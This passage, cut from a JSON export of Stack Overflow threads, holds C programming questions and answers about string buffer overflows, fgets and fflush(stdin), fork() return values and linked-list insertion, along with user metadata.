EMAIL:\n        (person + personNumber)-&gt;eMail = (char*) malloc ( WORD_SIZE * sizeof(char));\n        break;\n    }\n\n    char space[2];\n    strcpy(space, \" \");\n\n    switch (whichData) {\n    case NAME:\n        if (*nameTimes == 0) {\n            strcpy( (person+personNumber)-&gt;name, buffer);\n        }\n        else {\n            strcat ( (person+personNumber)-&gt;name, space);\n            strcat( (person+personNumber)-&gt;name, buffer);\n        }\n        break;\n\n    case SURNAME:\n        if (*surnameTimes == 0) {\n            strcpy ( (person+personNumber)-&gt;surname, buffer);\n        }\n        else {\n            strcat( (person + personNumber)-&gt;surname, space);\n            strcat( (person + personNumber)-&gt;surname, buffer);\n        }\n        break;\n\n    case EMAIL:\n        strcpy( (person + personNumber)-&gt;eMail, buffer);\n        break;\n\n    case ID:\n        (person+personNumber)-&gt;id = atoi(buffer);\n        break;\n    }\n\n}\n\nvoid printData (PEOPLE* person, FILE* sptr, int personNumber) {\n    fprintf(sptr, \"-------------------------------------------------------------------------------------------------------------------------------------------------------------------\");\n    fprintf(sptr, \"\\n|%30s\\t\\t\", \"***NAME***\");\n    fprintf(sptr, \"|%30s\\t\\t\", \"***SURNAME***\");\n    fprintf(sptr, \"|%30s\\t\\t\", \"***E-MAIL***\");\n    fprintf(sptr, \"|%30s\\t|\\n\", \"***ID NUMBER***\");\n    fprintf(sptr, \"-------------------------------------------------------------------------------------------------------------------------------------------------------------------\");\n\n    int i;\n\n    for (i = 0; i&lt;personNumber; ++i) {\n        fprintf(sptr, \"\\n|%d%30s\\t\\t\", i, (person+i)-&gt;name);\n        fprintf(sptr, \"|%30s\\t\\t\", (person+i)-&gt;surname);\n        fprintf(sptr, \"|%30s\\t\\t\", (person+i)-&gt;eMail);\n        fprintf(sptr, \"|%30d\\t|\\n\", (person+i)-&gt;id);\n        fprintf(sptr, \"-------------------------------------------------------------------------------------------------------------------------------------------------------------------\");\n    }\n}\n</code></pre>\n\n<p>I try to <code>malloc</code> every new struct and inside of it, free my buffers after I finish my work with them and allocate them again for next ones. If there is more than one name or surname for one person, I allocate its name or surname once and and <code>strcpy</code> my buffer to appropriate place. If I go to my <code>writeData</code> function for name or surname again for same person, I pass the allocated memory because I already did that. Then I'm basically concatenating my new buffer (name or surname) next to old one.</p>\n\n<p>My question is, why am I getting these invalid characters, where did I make a mistake and how can I prevent it?</p>\n"}, {"tags": ["c", "arrays", "string"], "comments": [{"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "edited": false, "score": 3, "creation_date": 1545772326, "post_id": 53925624, "comment_id": 94692833, "body": "Can you please provide sample input and output?"}, {"owner": {"reputation": 412, "user_id": 3721394, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8c715fc2c87838a4fcc02a506f6cfe81?s=128&d=identicon&r=PG&f=1", "display_name": "A.Akram", "link": "https://stackoverflow.com/users/3721394/a-akram"}, "edited": false, "score": 0, "creation_date": 1545772666, "post_id": 53925624, "comment_id": 94692868, "body": "If I remember correct: <code>string2[LIMIT2]</code> will allocate for you only <code>LIMIT2=5</code> chars, after this place it&#39;s not yours. I think you need to use <code>malloc</code>"}, {"owner": {"reputation": 3125, "user_id": 2878796, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8bxWv.png?s=128&g=1", "display_name": "UnholySheep", "link": "https://stackoverflow.com/users/2878796/unholysheep"}, "reply_to_user": {"reputation": 412, "user_id": 3721394, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/8c715fc2c87838a4fcc02a506f6cfe81?s=128&d=identicon&r=PG&f=1", "display_name": "A.Akram", "link": "https://stackoverflow.com/users/3721394/a-akram"}, "edited": false, "score": 1, "creation_date": 1545772870, "post_id": 53925624, "comment_id": 94692896, "body": "@A.Akram what difference would using <code>malloc</code> make in this code?"}], "answers": [{"comments": [{"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545773392, "post_id": 53925732, "comment_id": 94692984, "body": "<i>The next fgets will then consume the remainder</i> : false, you missed the fflush"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "reply_to_user": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "edited": false, "score": 0, "creation_date": 1545773471, "post_id": 53925732, "comment_id": 94692997, "body": "@bruno <code>fflush</code> on an input stream is undefined in standard C, and should not be used to clear unread input. On many platforms it doesn&#39;t."}], "tags": [], "owner": {"reputation": 100758, "user_id": 1899640, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/47374ccb28e4b0d2454b64f7b975bc66?s=128&d=identicon&r=PG", "display_name": "that other guy", "link": "https://stackoverflow.com/users/1899640/that-other-guy"}, "is_accepted": false, "score": 0, "last_activity_date": 1545773226, "creation_date": 1545773226, "answer_id": 53925732, "question_id": 53925624, "link": "https://stackoverflow.com/questions/53925624/i-have-two-char-arrays-and-when-their-sizes-are-different-the-program-doesnt-re/53925732#53925732", "title": "I have two char arrays and when their sizes are different the program doesn&#39;t read/write them properly", "body": "<p>You're not very specific about your actual and expected output, but I imagine it's this:</p>\n\n<p>Steps to reproduce:</p>\n\n<ol>\n<li>Run the program as posted</li>\n<li>Get the prompt <code>Type your username (maximum 30 characters)</code></li>\n<li>Enter <code>this is an especially long string</code></li>\n</ol>\n\n<p>Expected result:</p>\n\n<ul>\n<li>A prompt that says <code>Type a string of maximum 30 characters</code> and lets you enter a new string</li>\n</ul>\n\n<p>Actual result:</p>\n\n<ul>\n<li><code>Type a string of maximum 30 characters</code> is written to screen but the program continues immediately without letting you enter another string.</li>\n</ul>\n\n<p>This happens because the first <code>fgets</code> is set up to read no more than 30 characters from the user. If you enter more, it will only consume the first 30.</p>\n\n<p>The next <code>fgets</code> will then consume the remainder of that line instead of a new line, giving the appearance of skipping the prompt.</p>\n\n<p>You should use a large enough buffer to accomodate the line, so that this is not an issue. Alternatively, you can manually read and discard one character at a time until you find a <code>\\n</code>, effectively draining stdin of the rest of the line.</p>\n"}, {"tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": false, "score": 0, "last_activity_date": 1545774546, "last_edit_date": 1545774546, "creation_date": 1545773826, "answer_id": 53925778, "question_id": 53925624, "link": "https://stackoverflow.com/questions/53925624/i-have-two-char-arrays-and-when-their-sizes-are-different-the-program-doesnt-re/53925778#53925778", "title": "I have two char arrays and when their sizes are different the program doesn&#39;t read/write them properly", "body": "<p>Warning fgets will save the \\n if there is enough place to save it, I think your problem comes because in your examples the end of line is saved at least in the usename. So you need to remove it if present. </p>\n\n<p>Warning you give the size minus 1 to fgets, but fgets already read the given length minus 1 to have place to put the null character at the end.</p>\n\n<p>Note the message to read the second string is wrong because it indicates a length 30 rather than 4. </p>\n"}, {"tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": false, "score": 0, "last_activity_date": 1545774505, "last_edit_date": 1545774505, "creation_date": 1545774098, "answer_id": 53925804, "question_id": 53925624, "link": "https://stackoverflow.com/questions/53925624/i-have-two-char-arrays-and-when-their-sizes-are-different-the-program-doesnt-re/53925804#53925804", "title": "I have two char arrays and when their sizes are different the program doesn&#39;t read/write them properly", "body": "<p>You seem to be relying on <code>fflush(stdin)</code> to clear any unread input. This is undefined behaviour in standard C, and only works on some platforms as a non-standard extension. I suspect it doesn't work on yours, and either breaks input altogether or does nothing and causes the next <code>fgets</code> to read the rest of the input intended for the previous one.</p>\n\n<p>Instead of <code>fflush</code>, you can check whether the string read by <code>fgets</code> ends in a newline (<code>'\\n'</code>, which you probably want to remove if it is there). If not, keep reading (and discarding) input until either a newline <code>'\\n'</code> or EOF is encountered.</p>\n\n<p>(In general I would also recommend not using <code>scanf</code> for user input - it's a lot easier to read into a temporary buffer with <code>fgets</code> and parse that with <code>sscanf</code> as needed.)</p>\n\n<p>Another obvious, but unrelated, problem is <code>strcat(username, string2);</code> \u2013 this may exceed the length of <code>username</code>. You need to leave at least <code>LIMIT2 - 1</code> extra space (that you don't allow <code>fgets</code> to use), or simply allocate a new array of the correct size after you know the lengths of each.</p>\n"}], "owner": {"reputation": 1, "user_id": 10832989, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-EO2074sw5oc/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcY5vCVCTlrXieAI8vOoH1iDLoLLhg/mo/photo.jpg?sz=128", "display_name": "BountyHunter29", "link": "https://stackoverflow.com/users/10832989/bountyhunter29"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 45, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1545774546, "creation_date": 1545771910, "last_edit_date": 1545772105, "question_id": 53925624, "link": "https://stackoverflow.com/questions/53925624/i-have-two-char-arrays-and-when-their-sizes-are-different-the-program-doesnt-re", "title": "I have two char arrays and when their sizes are different the program doesn&#39;t read/write them properly", "body": "<p>I have a program to do basic things with two char arrays. Everything works fine when the size limit of the first is equal to size limit of the second, but when the size of the first char array is different to the size of the other, the program starts to read/write the strings in a strange way.</p>\n\n<p>For example, if the limit of the first is 31 and the limit of the other is 5, if the typed characters in the first are more than 8 or something like that the program won't let the user typed anything on the second array as if it was full already.</p>\n\n<p>I tried to fix it without using the functions of string.h, but the programs still did the same when the size limit of the two char arrays were different.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define LIMIT1 31\n#define LIMIT2 5\n\n/*Function: void copy_string(char *pointer_destination, char *pointer_source)\nPrecondition: it needs a pointer to the direction of memory of the first element of two char vectors and the size limit of the 'destination' vector\nPostcondition: it puts all the elements of the 'source' vector into the other until the last element that */\n\nvoid copy_string(char *pointer_destination, char *pointer_source, int LIMd){\n\n    //Variable declaration\n    int i = 0;\n\n    /*Cycle for replacing the element of the 'destination' vector by the element of the 'source' vector.\n    When the element of the 'destination' OR of the 'source' is the null character, this cycle ends*/\n    for(; i &lt; LIMd &amp;&amp; *(pointer_source + i) != '\\0'; i++){\n        *(pointer_destination + i) = *(pointer_source + i);\n    }\n    *(pointer_destination + i) = '\\0';\n}\n\nint main(){\n\n    //Variable declaration\n    int restart;\n    char username[LIMIT1], string2[LIMIT2];//Here we define the limit for obvious reasons\n\n    //Restart cycle starts here\n    do{\n\n        //Data input\n        printf(\"Type your username (maximum 30 characters)\\n\");\n        fgets(username, LIMIT1 - 1, stdin);\n        fflush(stdin);\n\n        printf(\"Type a string of maximum 30 characters\\n\");\n        fgets(string2, LIMIT2 - 1, stdin);\n        fflush(stdin);\n\n        printf(\"Your typed username and your typed second string are, respectively:\\n\");\n        fputs(username, stdout);\n        fputs(string2, stdout);\n\n        printf(\"Concatenating, the username is now\\n\");\n        strcat(username, string2);\n        fputs(username, stdout);\n\n        printf(\"Now I'll copy what is in your username and I'll put it in the second string,\\n\");\n        copy_string(string2, username, LIMIT2 - 1);\n        fputs(string2, stdout);\n\n    //Restart cycle switch\n    printf(\"Type '0' to close this program, otherwise it'll restart itself\\n\");\n    scanf(\"%d\", &amp;restart);\n    fflush(stdin);\n\n    //Restart cycle ends here\n    }while(restart);\n\n    return 0;\n}\n</code></pre>\n\n<p>I expected that if the size of the two arrays were different, the program would still read and write them properly (if the size of the first is 3, read from the user only the first three characters and put behing a \\0 and if the size of the other is 25 do the same but with 25 as the size limit)</p>\n"}, {"tags": ["c", "fork", "pid"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1545769755, "post_id": 53925416, "comment_id": 94692417, "body": "The <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/fork.html\" rel=\"nofollow noreferrer\"><code>fork</code></a> function is really the only one that returns <b><i>twice</i></b>. One time in the parent process, and one time in the newly created child process. Perhaps you should take some time to read <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/fork.html\" rel=\"nofollow noreferrer\">the manual page</a>, and especially what it returns?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1545770505, "post_id": 53925416, "comment_id": 94692572, "body": "You should include <code>&lt;unistd.h&gt;</code> so you have a declaration for <code>fork()</code>.  You should probably augment the <code>printf()</code> lines with at least the current process&#39;s PID, and maybe the parent process&#39;s PID too: <code>printf(&quot;x = %i y = %i (PID = %d; PPID = %d)\\n&quot;, x, y, (int)getpid(), (int)getppid());</code> \u2014 there isn&#39;t a defined format letter for PIDs, so a cast to <code>int</code> and using <code>%d</code> (or <code>%i</code> if you prefer) is reasonably safe (at least on systems with 32-bit <code>int</code> or bigger).  You probably should consider waiting for child processes to exit: <code>#include &lt;sys&#47;wait.h&gt;</code> and using <code>wait()</code> or <code>waitpid()</code>."}, {"owner": {"reputation": 1254, "user_id": 5209502, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/eb092e7e021c43c31b64f495725a6412?s=128&d=identicon&r=PG&f=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/5209502/paul"}, "edited": false, "score": 0, "creation_date": 1546047996, "post_id": 53925416, "comment_id": 94770147, "body": "Also, the output of your program will vary depends on which buffering type you are using. eg. <code>a.out</code> or <code>a.out &gt; output</code>. You may read <a href=\"https://linux.die.net/man/3/setbuf\" rel=\"nofollow noreferrer\">this</a> for further information."}], "answers": [{"tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": false, "score": 0, "last_activity_date": 1545770355, "last_edit_date": 1545770355, "creation_date": 1545769962, "answer_id": 53925455, "question_id": 53925416, "link": "https://stackoverflow.com/questions/53925416/how-fork-and-pid-if-pid-0-work-in-this-code/53925455#53925455", "title": "How fork and pid (if (pid != 0)) work in this code?", "body": "<p>Here</p>\n\n<pre><code> pid = fork();\n</code></pre>\n\n<p><code>fork()</code> creates a new process by duplicating the calling process &amp; first it returns the <strong>child process pid</strong> to the <strong>parent</strong>, so this</p>\n\n<pre><code>if (pid != 0) { } /* 2345 != 0 i.e parent process, lets assume pid returned is 2345 */\n</code></pre>\n\n<p>gets true i.e parent process and then it returns <code>0</code> to the <strong>child proces</strong>s, so next it looks like</p>\n\n<pre><code>if (pid != 0) { /* 0 != 0 .. child process */ } \n</code></pre>\n\n<p>From the manual page of <a href=\"http://man7.org/linux/man-pages/man2/fork.2.html\" rel=\"nofollow noreferrer\">fork()</a></p>\n\n<blockquote>\n  <p><strong>RETURN VALUE</strong>\n         On success, the <strong>PID of the child process is returned in the parent</strong>, and\n         <strong>0  is returned in the child</strong>.  On failure, -1 is returned in the parent,\n         no child process is created, and errno is set appropriately.</p>\n</blockquote>\n\n<p>Also <code>fork()</code> return type should be of <code>pid_t</code> not of <code>int</code> type. correct one is</p>\n\n<pre><code> pid_t pid = fork();\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 2, "last_activity_date": 1546043880, "last_edit_date": 1546043880, "creation_date": 1545815553, "answer_id": 53929865, "question_id": 53925416, "link": "https://stackoverflow.com/questions/53925416/how-fork-and-pid-if-pid-0-work-in-this-code/53929865#53929865", "title": "How fork and pid (if (pid != 0)) work in this code?", "body": "<p>The <code>fork()</code> function is unusual; it returns twice, once in each of two different (but closely related) processes, unless it fails.  It returns <code>-1</code> if it fails (in the original process, of necessity).  If it succeeds, it returns <code>0</code> in the child process, while it returns the PID of the child process in the original (parent) process, which is never <code>0</code> (or negative).</p>\n\n<p>You should learn to instrument code.  In the context of code using <code>fork()</code>, it is usually effective to print the PID (process ID) and the PPID (parent process ID) to help disambiguate which process prints what.  The short answer to your question about which process prints is that two processes print the data from the first <code>printf()</code> call, and four processes print the data from the second <code>printf()</code> call \u2013 unless you pipe the output of the program to another (such as <code>cat</code>), in which case it appears that some processes print the data multiple times.  (See also <a href=\"https://stackoverflow.com/questions/2530663/printf-anomaly-after-fork\"><code>printf()</code> anomaly after <code>fork()</code></a>.)</p>\n\n<p>Let's instrument your code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{\n    printf(\"PID = %d\\n\", (int)getpid());\n\n    int x = 10;\n    int y = 10;\n\n    int pid = fork();\n    if (pid != 0)\n    {\n       x++;\n       y--;\n    }\n    printf(\"1: x = %i y = %i (PID %d, PPID %d)\\n\",\n           x, y, (int)getpid(), (int)getppid());\n\n    pid = fork();\n    if (pid != 0)\n    {\n       x++;\n       y--;\n    }\n    printf(\"2: x = %i y = %i (PID %d, PPID %d)\\n\",\n           x, y, (int)getpid(), (int)getppid());\n\n    int status;\n    int corpse;\n    while ((corpse = wait(&amp;status)) &gt; 0)\n    {\n        printf(\"%d: child %d exited with status 0x%.4X\\n\",\n               (int)getpid(), corpse, status);\n    }\n\n    return (getpid() % 16);\n}\n</code></pre>\n\n<p>The return statement at the end of <code>main()</code> returns non-zero exit status 15 times out of 16 just to make things a little more interesting.</p>\n\n<p>Examples runs (of program <code>./fork43</code> built from <code>fork43.c</code>) \u2014 one without piping, one with piping:</p>\n\n<pre><code>$ ./fork43\nPID = 26226\n1: x = 11 y = 9 (PID 26226, PPID 23612)\n2: x = 12 y = 8 (PID 26226, PPID 23612)\n1: x = 10 y = 10 (PID 26227, PPID 26226)\n2: x = 11 y = 9 (PID 26228, PPID 26226)\n2: x = 11 y = 9 (PID 26227, PPID 26226)\n26226: child 26228 exited with status 0x0400\n2: x = 10 y = 10 (PID 26229, PPID 26227)\n26227: child 26229 exited with status 0x0500\n26226: child 26227 exited with status 0x0300\n$ ./fork43 | cat\nPID = 26230\n1: x = 11 y = 9 (PID 26230, PPID 23612)\n2: x = 11 y = 9 (PID 26233, PPID 26230)\nPID = 26230\n1: x = 10 y = 10 (PID 26232, PPID 26230)\n2: x = 10 y = 10 (PID 26234, PPID 26232)\nPID = 26230\n1: x = 10 y = 10 (PID 26232, PPID 26230)\n2: x = 11 y = 9 (PID 26232, PPID 26230)\n26232: child 26234 exited with status 0x0A00\nPID = 26230\n1: x = 11 y = 9 (PID 26230, PPID 23612)\n2: x = 12 y = 8 (PID 26230, PPID 23612)\n26230: child 26233 exited with status 0x0900\n26230: child 26232 exited with status 0x0800\n$\n</code></pre>\n\n<p>In the first run, the initial (parent) process has PID 26226.  It forks, and its child is 26227.  The parent process is told its child PID, so it increments <code>x</code> and decrements <code>y</code>; it then executes the <code>printf()</code> statement where the format string starts <code>1:</code>, printing the values <code>x</code> as 11 and <code>y</code> as 9.  In this run, the parent process forks again creating its second child with PID 26228.  The parent increments <code>x</code> and decrements <code>y</code> again, and executes the <code>printf()</code> statement where the format string starts <code>2:</code> before anything else happens.  It then reaches the <code>wait()</code> loop and waits for one of its children to die.</p>\n\n<p>Then the first child process (26227) executes the <code>printf()</code> statement where the format string starts <code>1:</code> but the values of <code>x</code> and <code>y</code> are both unchanged at 10.  It then reaches the second fork and creates its own child (the original process's grandchild) process with PID 26229.</p>\n\n<p>The second child 26228 has the (x, y) values (11, 9) because those were the values when it was forked, so it prints those values when it executes the <code>printf()</code> statement where the format string starts with <code>2:</code>.</p>\n\n<p>After the first child forks, it gets told its child's PID, so it increments <code>x</code> and decrements <code>y</code>, printing the values 11 and 9.</p>\n\n<p>The second child exits and its status is reported by the original process.  The grandchild process now executes the <code>printf()</code> statement where the format string starts with <code>2:1.  Since the value in</code>pid<code>was 0 twice, the values in</code>x<code>and</code>y` are still unchanged at 10.  It then exits.</p>\n\n<p>The first child can report that its child exited, and then itself exits.  The parent process reports that the first child exited and also exits.</p>\n\n<p>Overall, there is one copy of the <code>PID</code> output, two copies of <code>1:</code>, and 4 copies of <code>2:</code> (plus three 'child exited' reports).</p>\n\n<p>The second run, with the output piped to <code>cat</code>, shows that the output is fully buffered instead of line buffered, so processes flush the written data as they exit, not when newlines are printed.  This is why there are 4 copies of the introductory <code>PID = 26230</code> output, and 4 copies of the <code>1:</code> output as well.  There are still just 3 'child exited' reports.</p>\n\n<p>Printing the PID information like this is a valuable aid towards understanding the code.  It is important to recognize that the sequence of output is not fixed.  Different runs could produce different sequences (quite apart from the different PID numbers) simply because of the scheduling algorithm and what else is happening on the computer at the same time.</p>\n"}], "owner": {"reputation": 1, "user_id": 10832621, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-xraThhLPv-A/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcZ9ouSIL0SCb-WaDW-BhNzA4fRFRQ/mo/photo.jpg?sz=128", "display_name": "gina frav", "link": "https://stackoverflow.com/users/10832621/gina-frav"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2369, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1546043880, "creation_date": 1545769472, "last_edit_date": 1545812821, "question_id": 53925416, "link": "https://stackoverflow.com/questions/53925416/how-fork-and-pid-if-pid-0-work-in-this-code", "title": "How fork and pid (if (pid != 0)) work in this code?", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main()\n{\n    int pid;\n    int x, y;\n\n    x = 10;\n    y = 10;\n    pid = fork();\n\n    if (pid != 0)\n    {\n       x++;\n       y--;\n    }\n\n    printf(\"x = %i y = %i\\n\", x, y);\n\n    pid = fork();\n\n    if (pid != 0)\n    {\n       x++;\n       y--;\n    }\n    printf(\"x = %i y = %i\\n\", x, y);\n\n    return (0);\n}\n</code></pre>\n\n<p>I am completely confused by this part of the code. Can anyone explain me how it works?\nAlso I can't understand which process (child/parent) prints.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 40613, "user_id": 4099593, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/zweIW.png?s=128&g=1", "display_name": "Bhargav Rao", "link": "https://stackoverflow.com/users/4099593/bhargav-rao"}, "edited": false, "score": 0, "creation_date": 1545776719, "post_id": 53925334, "comment_id": 94693500, "body": "Comments are not for extended discussion; this conversation has been <a href=\"https://chat.stackoverflow.com/rooms/185765/discussion-on-question-by-elad-kobi-adding-a-node-to-a-linked-list\">moved to chat</a>."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1545807672, "post_id": 53925334, "comment_id": 94698149, "body": "You will want to review: <a href=\"http://stackoverflow.com/questions/750178/is-it-a-good-idea-to-typedef-pointers\">Is it a good idea to <b>typedef</b> pointers?</a>. (hint: No) There is no need to cast the return of <code>malloc</code>, it is unnecessary. See: <a href=\"http://stackoverflow.com/q/605845/995714\">Do I cast the result of malloc?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545773547, "post_id": 53925695, "comment_id": 94693011, "body": "Note: in the function signature the parameter <code>struct node **head</code> means the call to the function used: &amp;head`  Otherwise the function cannot change where the <code>head</code> of the linked list points."}, {"owner": {"reputation": 6578, "user_id": 10524386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe8a1950a1d7e1eccd4cff228c5420ea?s=128&d=identicon&r=PG", "display_name": "grapes", "link": "https://stackoverflow.com/users/10524386/grapes"}, "edited": false, "score": 0, "creation_date": 1545821061, "post_id": 53925695, "comment_id": 94702426, "body": "<code>if( !*curr )</code> is a mistake"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "reply_to_user": {"reputation": 6578, "user_id": 10524386, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fe8a1950a1d7e1eccd4cff228c5420ea?s=128&d=identicon&r=PG", "display_name": "grapes", "link": "https://stackoverflow.com/users/10524386/grapes"}, "edited": false, "score": 0, "creation_date": 1545873235, "post_id": 53925695, "comment_id": 94717319, "body": "@grapes,  so what would be the correct statement?  Note: I was trying to check if the head pointer, back in the caller is still NULL because no nodes have been added to the linked list  Perhaps it should be: <code>if( !(*curr) )</code>"}], "tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1545773725, "last_edit_date": 1545773725, "creation_date": 1545772871, "answer_id": 53925695, "question_id": 53925334, "link": "https://stackoverflow.com/questions/53925334/adding-a-node-to-a-linked-list/53925695#53925695", "title": "Adding a node to a linked list", "body": "<p>The following proposed code:</p>\n\n<ol>\n<li>eliminates unused parameters</li>\n<li>cleanly compiles</li>\n<li>performs the desired operation</li>\n<li>properly checks for errors</li>\n</ol>\n\n<p>And now, the proposed code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\n// format struct definition for readability \n// and eliminate undesireable 'typedef' of a pointer\nstruct Item \n{ \n    int num; \n    float price; \n    struct Item* next; \n};\n\n\n// use meaningful names for paramters and\n// allow for this might be first entry into linked list\nvoid AddNewItem(struct Item **head, int num, float price)\n{\n    struct Item *curr = *head;\n    struct Item *prev = *head;\n\n    struct Item *newNode = malloc(sizeof(struct Item));\n    if( !newNode )\n    {\n        perror( \"malloc failed\" );\n        exit( EXIT_FAILURE );\n    }\n\n    // implied else, malloc successful\n\n    // initialize fields of new node\n    newNode-&gt;num = num;\n    newNode-&gt;price = price;  \n    newNode-&gt;next = NULL;\n\n    // check if first node added to linked list\n    if( !*curr )\n    { // then first addition to linked list\n        *curr = newNode;\n    }\n\n    else\n    {\n        // check for end of linked list and\n        // check for found desired position in linked list\n        while ( curr-&gt;next )  \n        {\n            if( curr-&gt;num &gt;= newNode-&gt;num )\n            {\n                break;\n            }\n\n            // implied else\n\n            prev = curr;\n            curr = curr-&gt;next;\n        }\n\n        // insert the new item into the linked list\n        newNode-&gt;next = curr;\n        prev-&gt;next = newNode;\n    }\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545872938, "post_id": 53930893, "comment_id": 94717277, "body": "Your posted code did not use <code>tail</code> so since that made it an unused parameter, I did not mention it in my answer.  It was TOTALLY not clear that you wanted to order the list via the value in <code>n</code>. So I did not use it.  However, you could use <code>n</code> rather than <code>num</code> (another strong case for using meaningful variable and parameter names).  BTW: you answer is not an answer to the question,  Much better to have commented on my answer"}], "tags": [], "owner": {"reputation": 1, "user_id": 10834709, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-0Pv2mhIJ9Zc/AAAAAAAAAAI/AAAAAAAAAAA/AKxrwcZcNSWhQKXSdB4N9FqhS8Iszae1zQ/mo/photo.jpg?sz=128", "display_name": "Or Shaul", "link": "https://stackoverflow.com/users/10834709/or-shaul"}, "is_accepted": false, "score": 0, "last_activity_date": 1545820821, "creation_date": 1545820821, "answer_id": 53930893, "question_id": 53925334, "link": "https://stackoverflow.com/questions/53925334/adding-a-node-to-a-linked-list/53930893#53930893", "title": "Adding a node to a linked list", "body": "<p>@user3629249 It's Elad Kobi.Thanks for the help.\nWhen I try to debug your code, I get a few errors.\nAnother thing, you did not use the parameters tail and n. \nThe parameter n represents the position of the node I want to add.</p>\n"}], "owner": {"reputation": 11, "user_id": 10764709, "user_type": "registered", "profile_image": 